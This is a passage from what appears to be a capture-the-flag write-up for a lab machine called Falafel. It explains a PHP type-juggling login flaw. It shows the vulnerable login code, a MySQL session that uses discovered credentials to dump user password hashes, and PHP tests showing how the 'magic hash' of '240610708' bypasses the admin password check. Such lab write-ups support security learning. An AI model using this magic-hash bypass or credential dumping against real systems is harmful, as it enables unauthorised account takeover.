          $_SESSION['user'] = $username;
          $_SESSION['role'] = "admin";
          header("refresh:1;url=upload.php");
          //die("Login Successful!");
          $message = "Login Successful!";
        }elseif($users['role']=="normal"){
                                  $_SESSION['user'] = $username;
                                  $_SESSION['role'] = "normal";
          header("refresh:1;url=profile.php");
                                  //die("Login Successful!");
          $message = "Login Successful!";
        }else{
          $message = "That's weird..";
        }
      }
      else{
        $message = "Wrong identification : ".$users['username'];
      }
    }
    else{
      $message = "Try again..";
    }
    //echo $message;
  }
  end:
?>
$ 
{% endhighlight %}

Now that we understand why the PHP code is vulnerable to type juggling, we might want to understand why the `admin` account was affected but not the `chris` account. The reason is that the `admin` user's password hash is a magic hash while the `chris` user's password hash isn't. This can be discovered by querying the database, as performed below.

{% highlight none linenos %}
$ @@mysql -umoshe -pfalafelIsReallyTasty@@
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 4
Server version: 5.7.21-0ubuntu0.16.04.1 (Ubuntu)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> @@show databases;@@
+--------------------+
| Database           |
+--------------------+
| information_schema |
| @@@falafel@@@            |
+--------------------+
2 rows in set (0.00 sec)

mysql> @@use falafel@@
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> @@select table_name from information_schema.tables where table_schema = "falafel";@@                      
+------------+                                                                                                      
| table_name |                                                                                                      
+------------+                                                                                                      
| @@@users@@@      |                                                                                                      
+------------+                                                                                                      
1 row in set (0.00 sec)                                                                                             

mysql> @@select * from users;@@
+----+----------+----------------------------------+--------+
| ID | username | password                         | role   |
+----+----------+----------------------------------+--------+
|  1 | @@@admin@@@    | @@@0e462096931906507119562988736854@@@ | admin  |
|  2 | @@@chris@@@    | @@@d4ee02a22fc872e36d9e3751ba72ddc8@@@ | normal |
+----+----------+----------------------------------+--------+
2 rows in set (0.00 sec)

mysql> @@quit@@
Bye
$ 
{% endhighlight %}

We connect to the database using the `mysql` tool and the database credentials we discovered earlier. Then, we list the databases and select the one named "falafel" since the other one is a default database. We then discover the `users` table by listing any tables in this database. Thereafter, we select all the rows and columns of the `users` table by executing `select * from users;`. This provides us with the password hashes of the `admin` and `chris` users.

{% highlight none linenos %}
$ @@php -a@@
Interactive mode enabled

php > @@var_dump("0e462097431906509019562988736854"=="0e462096931906507119562988736854");@@
bool(@@@true@@@)
php > @@var_dump("0e462097431906509019562988736854"==="0e462096931906507119562988736854");@@
bool(@@@false@@@)
php > @@var_dump("0e462097431906509019562988736854"=="d4ee02a22fc872e36d9e3751ba72ddc8");@@
bool(@@@false@@@)
php > @@var_dump("0e462097431906509019562988736854"==="d4ee02a22fc872e36d9e3751ba72ddc8");@@
bool(@@@false@@@)
php >
{% endhighlight %}

We authenticated using the password `240610708` which resulted in the hash `0e462097431906509019562988736854`. When performing a loose comparison, this hash is equal to the `admin` user's password hash but not the `chris` user's password hash, as can be seen above.
